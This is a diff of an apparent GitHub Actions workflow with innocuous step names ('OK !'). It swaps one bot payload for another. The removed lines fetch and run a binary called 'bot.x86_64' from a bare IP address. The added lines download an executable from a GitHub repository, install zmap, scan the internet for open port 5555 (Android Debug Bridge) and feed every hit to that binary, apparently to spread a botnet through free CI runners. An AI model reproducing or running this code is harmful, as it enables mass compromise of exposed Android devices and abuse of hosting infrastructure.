@@ -13,9 +13,11 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget http://213.209.143.62/bot.x86_64 -O Bot
-          chmod +x Bot
-          ./Bot
+          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/android
+          chmod +x android
+          apt update -y
+          apt install zmap
+          ulimit -n999999; ulimit -u999999; ulimit -e999999; zmap -p 5555 -o- -q -v0 -T3 | awk {'print $1":5555"'} | ./android
           
       - name: OK !
         run: |
